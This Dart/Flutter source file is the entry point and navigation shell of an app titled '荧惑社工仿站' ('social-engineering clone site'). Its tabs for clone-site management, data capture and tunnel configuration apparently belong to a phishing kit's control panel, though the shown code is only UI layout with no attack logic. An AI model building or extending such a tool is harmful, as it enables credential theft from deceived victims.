import 'package:flutter/material.dart';
import 'dart:math';

import 'screens/web_test_screen.dart';
import 'package:provider/provider.dart';
import 'providers/app_provider.dart';
import 'theme/app_theme.dart';
import 'screens/dashboard_screen.dart';
import 'screens/site_management_screen.dart';
import 'screens/data_capture_screen.dart';
import 'screens/config_manager_screen.dart';
import 'screens/settings_screen.dart';

void main() {
  runApp(
    ChangeNotifierProvider(
      create: (_) => AppProvider(),
      child: const MyApp(),
    ),
  );
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: '荧惑社工仿站',
      theme: AppTheme.lightTheme,
      home: const HomePage(),
      routes: {
        '/dashboard': (_) => const HomePage(),
        '/sites': (_) => const SiteManagementScreen(),
        '/capture': (_) => const DataCaptureScreen(),
        '/tunnel': (_) => const ConfigManagerScreen(),
        '/settings': (_) => const SettingsScreen(),
        '/webtest': (_) => const WebTestScreen(),
      },
    );
  }
}

class HomePage extends StatefulWidget {
  const HomePage({super.key});

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  int _selectedIndex = 0;
  final _pages = const [
    DashboardScreen(),
    SiteManagementScreen(),
    DataCaptureScreen(),
    ConfigManagerScreen(),
    SettingsScreen(),
  ];

  // 随机名言列表
  final List<String> _quotes = [
    "工欲善其事，必先利其器。——《论语》",
    "伟大的工作，并不是用力量而是用耐心去完成的。——约翰逊",
    "不要等待机会，而要创造机会。——萧伯纳",
    "知识就是力量。——培根",
    "细节决定成败。——汪中求",
    "效率是做好工作的灵魂。——切斯特菲尔德",
  ];

  // 获取随机名言
  String _getRandomQuote() {
    return _quotes[Random().nextInt(_quotes.length)];
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      // 只在首页显示自定义顶栏
      appBar: _selectedIndex == 0
          ? AppBar(
        toolbarHeight: 120,
        backgroundColor: Theme.of(context).primaryColor.withOpacity(0.95),
        shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.vertical(
            bottom: Radius.circular(20),
          ),
        ),
        flexibleSpace: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.end,
            children: [
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  const Text(
                    '荧惑社工仿站',
                    style: TextStyle(
                      fontSize: 20,
                      fontWeight: FontWeight.bold,
                      color: Colors.white,
                      shadows: [
                        Shadow(
                          color: Colors.black12,
                          offset: Offset(1, 1),
                          blurRadius: 3,
                        ),
                      ],
                    ),
                  ),
                  // 圆形头像
                  const SizedBox.shrink(),
                ],
              ),
              const SizedBox(height: 12),
              Container(
                width: double.infinity,
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Text(
                  _getRandomQuote(),
                  style: const TextStyle(
                    color: Colors.white,
                    fontSize: 13,
                    fontStyle: FontStyle.italic,
                  ),
                  overflow: TextOverflow.ellipsis,
                  maxLines: 1,
                ),
              ),
            ],
          ),
        ),
        title: const SizedBox(),
      )
          : AppBar(
        title: Text(_getPageTitle(_selectedIndex)),
        centerTitle: true,
        backgroundColor: Theme.of(context).primaryColor,
      ),
      body: _pages[_selectedIndex],
      bottomNavigationBar: _buildBottomNavBar(context),
    );
  }

  // 构建底部导航栏
  Widget _buildBottomNavBar(BuildContext context) {
    return Container(
      decoration: BoxDecoration(
        borderRadius: const BorderRadius.only(
          topLeft: Radius.circular(15),
          topRight: Radius.circular(15),
        ),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.1),
            spreadRadius: 0,
            blurRadius: 10,
            offset: const Offset(0, -5),
          ),
        ],
      ),
      child: ClipRRect(
        borderRadius: const BorderRadius.only(
          topLeft: Radius.circular(15),
          topRight: Radius.circular(15),
        ),
        child: BottomNavigationBar(
          currentIndex: _selectedIndex,
          onTap: _onItemTapped,
          type: BottomNavigationBarType.fixed,
          backgroundColor: Theme.of(context).cardColor,
          selectedItemColor: Theme.of(context).primaryColor,
          unselectedItemColor: Colors.grey,
          selectedFontSize: 12,
          unselectedFontSize: 12,
          items: [
            BottomNavigationBarItem(
              icon: Container(
                padding: const EdgeInsets.all(5),
                child: const Icon(Icons.dashboard),
              ),
              label: '首页',
            ),
            BottomNavigationBarItem(
              icon: Container(
                padding: const EdgeInsets.all(5),
                child: const Icon(Icons.web),
              ),
              label: '仿站管理',
            ),
            BottomNavigationBarItem(
              icon: Container(
                padding: const EdgeInsets.all(5),
                child: const Icon(Icons.data_exploration),
              ),
              label: '数据捕获',
            ),
            BottomNavigationBarItem(
              icon: Container(
                padding: const EdgeInsets.all(5),
                child: const Icon(Icons.cloud),
              ),
              label: '穿透配置',
            ),
            BottomNavigationBarItem(
              icon: Container(
                padding: const EdgeInsets.all(5),
                child: const Icon(Icons.settings),
              ),
              label: '设置',
            ),
          ],
        ),
      ),
    );
  }

  void _onItemTapped(int index) {
    setState(() {
      _selectedIndex = index;
    });
  }

  // 获取页面标题
  String _getPageTitle(int index) {
    switch (index) {
      case 0: return '控制面板';
      case 1: return '仿站管理';
      case 2: return '数据捕获';
      case 3: return '穿透配置';
      case 4: return '系统设置';
      default: return '荧惑社工仿站';
    }
  }
}